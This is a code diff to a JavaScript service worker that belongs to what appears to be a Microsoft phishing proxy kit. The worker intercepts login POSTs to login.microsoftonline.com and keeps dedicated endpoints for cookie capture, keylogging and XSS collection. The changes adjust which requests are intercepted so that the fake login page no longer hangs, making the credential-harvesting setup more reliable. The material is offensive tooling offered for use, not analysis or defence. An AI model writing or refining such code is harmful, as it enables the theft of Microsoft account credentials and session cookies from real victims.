@@ -1,7 +1,7 @@
 // ============================================================
 //  SERVICE WORKER - Enhanced for Microsoft Proxy Integration
 //  Intercepts requests, captures data, forwards to proxy
-//  FIXED: CORS errors, API calls, page hangs
+//  FIXED: Skip /login endpoint to prevent page hanging
 // ============================================================
 
 const PROXY_PATH = "/lNv1pC9AWPUY4gbidyBO";
@@ -13,7 +13,6 @@ const KEYLOG_ENDPOINT = "/keylog";
 const CACHE_NAME = 'microsoft-proxy-cache-v1';
 const CACHE_URLS = [
     '/',
-    '/login',
     '/@',
     '/health'
 ];
@@ -50,12 +49,19 @@ self.addEventListener('activate', (event) => {
 });
 
 // ============================================================
-//  FETCH HANDLER - WITH FIXES FOR CORS AND API CALLS
+//  FETCH HANDLER - WITH FIXES FOR CORS AND PAGE HANGING
 // ============================================================
 
 self.addEventListener("fetch", (event) => {
     const url = new URL(event.request.url);
     
+    // ✅ CRITICAL FIX: Skip ALL /login requests (causes page hanging)
+    if (event.request.url.includes('/login') || 
+        event.request.url.includes('/proxy-login')) {
+        // Let the browser handle /login directly
+        return;
+    }
+
     // ✅ SKIP: Proxy requests to avoid loops
     if (event.request.url.includes('/lNv1pC9AWPUY4gbidyBO')) {
         return;
@@ -71,6 +77,18 @@ self.addEventListener("fetch", (event) => {
         return;
     }
 
+    // ✅ SKIP: Session endpoint
+    if (event.request.url.includes('/sessions')) {
+        return;
+    }
+
+    // ✅ SKIP: XSS, Cookie, Keylog endpoints
+    if (event.request.url.includes('/xss-collect') ||
+        event.request.url.includes('/cookie-capture') ||
+        event.request.url.includes('/keylog')) {
+        return;
+    }
+
     // ✅ SKIP: Microsoft API calls (cause CORS errors)
     if (event.request.url.includes('/v1.0/me') ||
         event.request.url.includes('/common/userinfo') ||
@@ -79,23 +97,19 @@ self.addEventListener("fetch", (event) => {
         return;
     }
 
-    // Handle different request types
+    // Handle different request types - ONLY for non-login pages
     if (event.request.method === 'POST') {
         // ✅ ONLY intercept login POST requests to Microsoft
-        if (event.request.url.includes('login.microsoftonline.com') || 
-            event.request.url.includes('/proxy-login')) {
+        if (event.request.url.includes('login.microsoftonline.com')) {
             event.respondWith(handlePostRequest(event.request));
         }
-        // Otherwise, let it pass through
         return;
     } else if (event.request.method === 'GET') {
-        // ✅ ONLY intercept HTML pages
+        // ✅ ONLY intercept HTML pages (excluding /login)
         if (event.request.url.includes('.html') || 
-            !event.request.url.includes('.') ||
-            event.request.url.includes('/login')) {
+            (event.request.url.endsWith('/') && !event.request.url.includes('/login'))) {
             event.respondWith(handleGetRequest(event.request));
         }
-        // Otherwise, let it pass through
         return;
     } else {
         // Default: forward request
@@ -367,4 +381,4 @@ console.log('[SW] 🔗 Proxy Path:', PROXY_PATH);
 console.log('[SW] 🎯 XSS Endpoint:', XSS_ENDPOINT);
 console.log('[SW] 🍪 Cookie Endpoint:', COOKIE_ENDPOINT);
 console.log('[SW] ⌨️ Keylog Endpoint:', KEYLOG_ENDPOINT);
-console.log('[SW] ✅ API calls DISABLED to prevent CORS');
+console.log('[SW] ✅ /login SKIPPED to prevent page hanging');
